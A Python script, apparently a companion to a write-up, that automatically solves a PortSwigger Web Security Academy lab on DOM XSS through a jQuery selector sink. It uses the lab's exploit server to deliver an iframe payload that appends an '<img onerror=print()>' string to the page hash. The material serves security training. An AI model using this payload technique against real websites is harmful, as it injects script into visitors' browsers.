#!/usr/bin/env python3
"""
DOM XSS in jQuery selector sink using a hashchange event
PortSwigger Web Security Academy — Cross-Site Scripting (XSS)

Companion script for the writeup: 06-dom-xss-jquery-selector-hashchange-event.md

What this does:
    location.hash never leaves the browser, and the vulnerable code only
    runs on a hashchange event -- simply loading a URL with a payload in
    the fragment isn't enough. Stores an iframe on the lab's exploit server
    that loads the target with an empty hash, then appends the payload to
    the hash in its onload handler, which fires hashchange after the page
    has already loaded. jQuery's $() then builds the appended string as
    HTML rather than treating it as a selector. Uses print() instead of
    alert(), matching PortSwigger's own solution -- alert() can be
    suppressed in headless/cross-origin iframe contexts, but print() isn't.

Usage:
    python 06-dom-xss-jquery-selector-hashchange-event.py <lab-url>
    e.g. python 06-dom-xss-jquery-selector-hashchange-event.py https://0a1b00fa03d9c8b6803b56b400eb00d5.web-security-academy.net

Requirements:
    pip install httpx
"""

import re
import sys
import time
import httpx


def get_exploit_server_url(client: httpx.Client) -> str:
    r = client.get("/")
    m = re.search(r'(https://exploit-[^\s"\'<>]+\.exploit-server\.net)', r.text)
    if not m:
        raise RuntimeError("could not find exploit server URL on lab homepage")
    return m.group(1).rstrip("/")


def exploit_server_deliver(exploit_url: str, body: str) -> bool:
    """Store the payload, verify it saved, then trigger the simulated victim."""
    headers = "HTTP/1.1 200 OK\r\nContent-Type: text/html; charset=utf-8"
    with httpx.Client(follow_redirects=True, timeout=20, verify=False) as c:
        form_data = {
            "urlIsHttps": "on",
            "responseFile": "/exploit",
            "responseHead": headers,
            "responseBody": body,
        }

        form_data["formAction"] = "STORE"
        r_store = c.post(exploit_url, data=form_data)
        if r_store.status_code >= 400:
            print(f"[!] Exploit server STORE failed: {r_store.status_code}")
            return False

        verify_url = exploit_url.rstrip("/") + "/exploit"
        try:
            r_verify = c.get(verify_url)
            print(f"[+] Payload stored and verified at {verify_url} ({len(r_verify.text)} bytes)")
        except Exception:
            print("[*] Payload stored (verify request failed, continuing)")

        form_data["formAction"] = "DELIVER_TO_VICTIM"
        r_deliver = c.post(exploit_url, data=form_data)
        success = r_deliver.status_code < 400
        print(f"[{'+' if success else '!'}] DELIVER_TO_VICTIM {'sent' if success else 'failed'} (status {r_deliver.status_code})")
        return success


def solve(lab_url: str) -> None:
    client = httpx.Client(base_url=lab_url, follow_redirects=True, timeout=20)
    client.get("/")

    exploit_url = get_exploit_server_url(client)
    print(f"[*] Exploit server: {exploit_url}")

    # Load the lab with an empty hash, then append the payload after load --
    # that append is what fires hashchange, not the initial navigation.
    iframe_body = (
        f'<iframe src="{lab_url}/#" '
        f'onload="this.src+=\'<img src=1 onerror=print()>\'"></iframe>'
    )
    print(f"[*] Iframe payload: {iframe_body}")
    exploit_server_deliver(exploit_url, iframe_body)

    print("[*] Waiting for the simulated victim to load the exploit...")
    time.sleep(5)

    check = client.get("/")
    if "Congratulations" in check.text:
        print("[+] Lab solved.")
    else:
        print("[-] Not solved yet -- try re-running, or check the exploit server access log.")


if __name__ == "__main__":
    if len(sys.argv) != 2:
        print(f"Usage: python {sys.argv[0]} <lab-url>")
        sys.exit(1)
    solve(sys.argv[1].rstrip("/"))
